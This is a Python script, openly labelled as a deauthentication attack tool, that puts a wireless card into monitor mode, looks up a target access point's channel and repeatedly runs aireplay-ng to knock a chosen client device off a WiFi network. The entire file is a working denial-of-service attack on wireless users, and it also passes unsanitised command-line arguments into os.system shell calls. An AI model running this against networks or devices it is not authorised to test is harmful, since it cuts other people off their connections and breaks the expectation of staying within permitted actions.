'''
 /// ************************************* ///
Script to perform deauth attack using aircrack-ng
 /// ************************************* ///
'''

#!/usr/bin/env python3
from wifi import Cell
from time import sleep
import sys
import os

# Check user privileges
def check_privileges():
    if os.geteuid() != 0:
        print("[!] You're not root !")
        exit()

# Set network interface
def set_interface_up(network_interface, network_channel):
    os.system('sudo ifconfig ' + network_interface + ' down')
    os.system('sudo iwconfig ' + network_interface + ' mode monitor')
    os.system('sudo ifconfig ' + network_interface + ' up')
    os.system('sudo airmon-ng start ' + network_interface + ' ' + network_channel)

# Find channel by passing network_bssid
def find_channel(network_interface, network_bssid):
    networks = list(Cell.all(network_interface))
    for network in networks:
        if network.address == network_bssid:
            return str(network.channel)

# Start deauth attack
def start_deauth(network_bssid, client_mac, network_interface):
    try:
        while True:
            os.system('aireplay-ng -0 5 -a '+ network_bssid + ' -c ' + client_mac + " " + network_interface)
            sleep(100)
    except KeyboardInterrupt:
        exit()

# Main function
def main():
    # Check current user privileges
    check_privileges()

    # Network bssid and client MAC
    network_bssid = sys.argv[1]
    client_mac = sys.argv[2]
    network_interface = sys.argv[3]
    network_channel = find_channel(network_interface, network_bssid)
    set_interface_up(network_interface, network_channel)
    start_deauth(network_bssid, client_mac, network_interface)


if __name__ == '__main__':
    main()
